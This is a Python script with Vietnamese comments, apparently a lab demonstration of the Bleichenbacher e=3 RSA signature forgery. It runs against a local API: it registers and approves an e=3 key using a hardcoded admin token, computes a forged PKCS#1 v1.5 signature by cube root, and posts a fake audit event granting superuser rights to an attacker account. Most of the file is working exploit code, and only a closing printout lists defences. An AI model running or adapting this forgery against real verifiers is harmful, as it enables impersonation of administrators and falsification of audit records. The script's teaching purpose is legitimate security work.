#!/usr/bin/env python3
"""
Bleichenbacher Signature Forgery Demo - RSA e=3 Attack

Demo này cho thấy cách forge RSA signature với e=3 và gửi payload giả lên hệ thống.

Quy trình:
1. Tạo RSA keypair với e=3 (vulnerable)
2. Đăng ký keypair lên hệ thống
3. Forge signature KHÔNG CẦN private key
4. Gửi payload giả với forged signature → THÀNH CÔNG!
"""

import base64
import hashlib
import json
import time
import requests
from typing import Tuple

# Cryptography imports
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.backends import default_backend

API_BASE = "http://localhost"
ADMIN_TOKEN = "my-super-secret-admin-token-2025"


def print_header(title: str):
    print(f"\n{'━'*3} {title} {'━'*3}\n")


def integer_cube_root(n: int) -> int:
    """
    Tính căn bậc 3 của số nguyên lớn (integer cube root).
    Sử dụng Newton-Raphson method.
    """
    if n < 0:
        return -integer_cube_root(-n)
    if n == 0:
        return 0
    
    # Initial guess
    x = 1 << ((n.bit_length() + 2) // 3)
    
    while True:
        x_new = (2 * x + n // (x * x)) // 3
        if x_new >= x:
            break
        x = x_new
    
    # Verify and adjust
    while x ** 3 > n:
        x -= 1
    while (x + 1) ** 3 <= n:
        x += 1
    
    return x


def generate_rsa_keypair_e3() -> Tuple[rsa.RSAPrivateKey, rsa.RSAPublicKey]:
    """
    Tạo RSA keypair với e=3 (VULNERABLE!)
    
    e=3 cho phép cube root attack vì:
    - signature³ = EM (mod n)
    - Nếu EM nhỏ hơn n, thì signature = ∛EM (không cần mod n)
    """
    print("Tạo RSA-2048 keypair với public exponent e=3...")
    
    private_key = rsa.generate_private_key(
        public_exponent=3,  # VULNERABLE!
        key_size=2048,
        backend=default_backend()
    )
    public_key = private_key.public_key()
    
    pub_numbers = public_key.public_numbers()
    print(f"  RSA modulus (n): {pub_numbers.n.bit_length()} bits")
    print(f"  Public exponent (e): {pub_numbers.e} ← VULNERABLE!")
    print(f"  (Standard e=65537 sẽ an toàn hơn nhiều)")
    
    return private_key, public_key


def get_key_pem(private_key: rsa.RSAPrivateKey, public_key: rsa.RSAPublicKey) -> Tuple[str, str]:
    """Chuyển đổi keys sang PEM format."""
    private_pem = private_key.private_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PrivateFormat.PKCS8,
        encryption_algorithm=serialization.NoEncryption()
    ).decode('utf-8')
    
    public_pem = public_key.public_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PublicFormat.SubjectPublicKeyInfo
    ).decode('utf-8')
    
    return private_pem, public_pem


def forge_signature_bleichenbacher(message: bytes, key_size_bytes: int = 256) -> bytes:
    """
    Forge RSA PKCS#1 v1.5 signature sử dụng Bleichenbacher cube root attack.
    
    Tấn công hoạt động vì:
    1. Với e=3: signature³ = EM (mod n)
    2. Nếu EM được craft sao cho EM < n, thì signature = ∛EM (exact)
    3. Weak verifier chỉ check: 00 01 prefix + hash có mặt đâu đó
    
    EM được craft:
    00 01 FF 00 [HASH] [GARBAGE đủ để lấp đầy key_size]
    """
    # Compute hash
    message_hash = hashlib.sha256(message).digest()
    
    # Craft EM: 00 01 FF 00 [HASH] [GARBAGE]
    # Weak verifier chỉ check:
    #   - Bắt đầu bằng 00 01
    #   - Có 00 separator trong 20 bytes đầu
    #   - Hash xuất hiện đâu đó sau separator
    
    prefix = b'\x00\x01\xff\x00'  # 00 01 FF 00
    
    # Thêm hash ngay sau prefix
    em_start = prefix + message_hash
    
    # Padding với zeros để đủ key_size
    em = em_start + b'\x00' * (key_size_bytes - len(em_start))
    
    print(f"\n  EM được craft (60 bytes đầu):")
    print(f"  {em[:60].hex()}")
    print(f"  → Bắt đầu với 00 01: ✓")
    print(f"  → Có FF padding: ✓")
    print(f"  → Có 00 separator: ✓")
    print(f"  → Chứa hash message: ✓")
    
    # Convert EM to integer
    em_int = int.from_bytes(em, byteorder='big')
    
    # Compute cube root
    # Với e=3: signature³ = EM → signature = ∛EM
    sig_int = integer_cube_root(em_int)
    
    # Điều chỉnh để sig³ >= em (quan trọng!)
    while sig_int ** 3 < em_int:
        sig_int += 1
    
    # Convert back to bytes
    forged_sig = sig_int.to_bytes(key_size_bytes, byteorder='big')
    
    return forged_sig


def register_key_with_api(service_id: str, public_pem: str) -> str:
    """Đăng ký public key với API và approve."""
    timestamp = int(time.time())
    key_id = f"{service_id}:v{timestamp}"
    
    # Register key
    resp = requests.post(
        f"{API_BASE}/v1/keys/register",
        json={
            "service_id": service_id,
            "public_key_id": key_id,
            "public_key_pem": public_pem,
            "algorithm": "rsa-pkcs1v15-vulnerable",  # Vulnerable algorithm
            "description": "Bleichenbacher demo key with e=3"
        }
    )
    
    if resp.status_code not in (200, 201):
        print(f"  ✗ Register failed: {resp.text}")
        return None
    
    print(f"  ✓ Registered: {key_id}")
    
    # Approve key using correct endpoint
    resp = requests.post(
        f"{API_BASE}/v1/admin/keys/review",
        headers={"X-Admin-Token": ADMIN_TOKEN},
        json={
            "public_key_id": key_id,
            "action": "approve"
        }
    )
    
    if resp.status_code == 200:
        print(f"  ✓ Key approved!")
    else:
        print(f"  ⚠ Approve response: {resp.status_code} - {resp.text}")
    
    return key_id


def send_forged_event(service_id: str, key_id: str, forged_signature: bytes, event_data: dict):
    """Gửi event với chữ ký giả đến API."""
    # Canonical JSON
    event_canonical = json.dumps(event_data, sort_keys=True, separators=(',', ':'))
    
    # Encode forged signature
    sig_b64 = base64.b64encode(forged_signature).decode('utf-8')
    
    payload = {
        "service_id": service_id,
        "event_type": "FORGED_ADMIN_ACTION",
        "event": event_canonical,
        "event_data": event_data,
        "signature": sig_b64,
        "public_key_id": key_id
    }
    
    print(f"\n  Payload:")
    print(f"    service_id: {service_id}")
    print(f"    event_type: FORGED_ADMIN_ACTION")
    print(f"    event_data: {json.dumps(event_data, indent=2)}")
    print(f"    signature: {sig_b64[:50]}...")
    
    # Send to /v1/logs (main endpoint now uses vulnerable verifier for rsa-pkcs1v15)
    resp = requests.post(
        f"{API_BASE}/v1/logs",
        json=payload
    )
    
    return resp


def verify_event_in_database(event_id: str):
    """Xác nhận event đã được lưu vào database."""
    resp = requests.get(f"{API_BASE}/v1/logs/{event_id}")
    if resp.status_code == 200:
        return resp.json()
    return None


def main():
    print("=" * 60)
    print("       BLEICHENBACHER SIGNATURE FORGERY DEMO")
    print("=" * 60)
    print()
    print("Demo này cho thấy cách FORGE signature và gửi payload GIẢ lên hệ thống!")
    print("Attacker KHÔNG CẦN private key!")
    
    # ========================================
    # PHẦN 1: Tạo RSA keypair với e=3
    # ========================================
    print_header("PHẦN 1: TẠO RSA KEYPAIR VỚI e=3")
    
    private_key, public_key = generate_rsa_keypair_e3()
    private_pem, public_pem = get_key_pem(private_key, public_key)
    
    # ========================================
    # PHẦN 2: Đăng ký key với hệ thống
    # ========================================
    print_header("PHẦN 2: ĐĂNG KÝ KEY VỚI HỆ THỐNG")
    
    service_id = f"attacker-service-{int(time.time())}"
    key_id = register_key_with_api(service_id, public_pem)
    
    if not key_id:
        print("✗ Không thể đăng ký key!")
        return
    
    # ========================================
    # PHẦN 3: Tạo payload giả
    # ========================================
    print_header("PHẦN 3: TẠO PAYLOAD GIẢ")
    
    # Payload giả mạo - giả vờ admin đã cấp quyền superuser!
    fake_event = {
        "action": "admin.grant_superuser",
        "actor": "admin@company.com",  # Giả mạo admin!
        "target": "attacker@evil.com",
        "permissions": ["superuser", "delete_all", "access_secrets"],
        "timestamp": "2025-12-07T10:00:00Z",
        "note": "This is a FORGED event - attacker never had private key!"
    }
    
    event_canonical = json.dumps(fake_event, sort_keys=True, separators=(',', ':'))
    print(f"Event giả:")
    print(f"  {json.dumps(fake_event, indent=2)}")
    
    # ========================================
    # PHẦN 4: FORGE SIGNATURE (không cần private key!)
    # ========================================
    print_header("PHẦN 4: FORGE SIGNATURE (KHÔNG CẦN PRIVATE KEY!)")
    
    print("Thực hiện Bleichenbacher cube root attack...")
    print()
    print("  Giải thích:")
    print("  1. Với e=3: signature³ = EM (mod n)")
    print("  2. Craft EM sao cho EM < n")
    print("  3. Tính: signature = ∛EM (cube root)")
    print("  4. Weak verifier chỉ check prefix và hash → BYPASS!")
    
    forged_signature = forge_signature_bleichenbacher(
        message=event_canonical.encode('utf-8'),
        key_size_bytes=256  # RSA-2048 = 256 bytes
    )
    
    print(f"\n  ✓ Forged signature (hex, 40 chars đầu):")
    print(f"    {forged_signature.hex()[:40]}...")
    
    # ========================================
    # PHẦN 5: GỬI PAYLOAD GIẢ LÊN HỆ THỐNG
    # ========================================
    print_header("PHẦN 5: GỬI PAYLOAD GIẢ LÊN HỆ THỐNG")
    
    print("Gửi event với chữ ký GIẢ đến /v1/logs...")
    
    resp = send_forged_event(service_id, key_id, forged_signature, fake_event)
    
    print(f"\n  Response:")
    print(f"    Status Code: {resp.status_code}")
    
    try:
        resp_json = resp.json()
        print(f"    Body: {json.dumps(resp_json, indent=6)}")
        
        if resp.status_code == 200 and resp_json.get("status") == "accepted":
            event_id = resp_json.get("id")
            
            print()
            print("  " + "!" * 50)
            print("  ⚠️  CHỮ KÝ GIẢ ĐÃ ĐƯỢC CHẤP NHẬN!")
            print("  ⚠️  PAYLOAD GIẢ ĐÃ LƯU VÀO DATABASE!")
            print("  " + "!" * 50)
            
            # ========================================
            # PHẦN 6: XÁC NHẬN TRONG DATABASE
            # ========================================
            print_header("PHẦN 6: XÁC NHẬN EVENT GIẢ TRONG DATABASE")
            
            if event_id:
                stored_event = verify_event_in_database(event_id)
                if stored_event:
                    print(f"  ✓ Event ID {event_id} tồn tại trong database!")
                    print(f"    service_id: {stored_event.get('service_id')}")
                    print(f"    event_type: {stored_event.get('event_type')}")
                    print(f"    verified: {stored_event.get('verified')}")
                    print(f"    event_data: {json.dumps(stored_event.get('event_data'), indent=6)}")
                else:
                    print(f"  Không thể verify event trong database")
        else:
            print(f"\n  Response message: {resp_json}")
            
    except Exception as e:
        print(f"    Raw: {resp.text}")
    
    # ========================================
    # KẾT LUẬN
    # ========================================
    print()
    print("=" * 60)
    print("       KẾT LUẬN")
    print("=" * 60)
    print()
    print("TẤN CÔNG THÀNH CÔNG KHI:")
    print("  ✓ RSA sử dụng e=3 (public exponent nhỏ)")
    print("  ✓ Verifier CHỈ kiểm tra:")
    print("      - Prefix 00 01")
    print("      - Hash có mặt đâu đó trong EM")
    print("  ✓ KHÔNG kiểm tra:")
    print("      - Đủ FF padding bytes (>= 8)")
    print("      - ASN.1 DigestInfo structure")
    print("      - Vị trí chính xác của hash")
    print()
    print("HẬU QUẢ:")
    print("  • Attacker KHÔNG CẦN private key!")
    print("  • Có thể forge signature cho BẤT KỲ message nào!")
    print("  • Có thể đưa log giả vào hệ thống audit!")
    print("  • Có thể giả mạo hành động của admin!")
    print()
    print("CÁCH PHÒNG CHỐNG:")
    print("  1. Sử dụng e=65537 (standard RSA)")
    print("  2. Dùng STRICT PKCS#1 v1.5 verifier")
    print("  3. Tốt hơn: Dùng RSA-PSS hoặc Ed25519")
    print("  4. Kiểm tra đầy đủ cấu trúc padding")


if __name__ == "__main__":
    main()
